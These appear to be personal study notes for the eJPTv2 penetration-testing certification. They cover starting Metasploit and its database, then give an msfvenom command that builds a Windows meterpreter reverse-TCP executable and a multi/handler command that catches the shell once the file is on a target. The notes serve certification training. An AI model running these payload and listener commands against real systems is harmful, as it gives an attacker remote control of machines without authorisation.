# EJPTv2_Notes

## SETTING UP METASPLOIT

### First run

1. make sure postgres is running 

```bash
root@kali:~# sudo systemctl start postgresql
```

2. initialize metasploit database

```bash
root@kali:~# sudo msfdb init
```

3. launch metasploit console

```bash
root@kali:~# msfconsole
```

### After first run

```bash
root@kali:~# sudo service postgresql start && msfconsole
```

### Setting global variable in msf

```bash
setg RHOSTS 10.10.10.10
```

## msfvenom X metasploit : reverse tcp
1. generate & save the payload to a file named `shell.exe`, for example:
   bash> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4443 -f exe > shell.exe`

3. upload the generated `.exe` file to the target machine using whatever method you prefer.
4. from msfconsole, use the following command to interact with the vulnerable machine:
`use multi\handler && set PAYLOAD windows/meterpreter/reverse_tcp && set LHOST YOUR-IP && exploit`.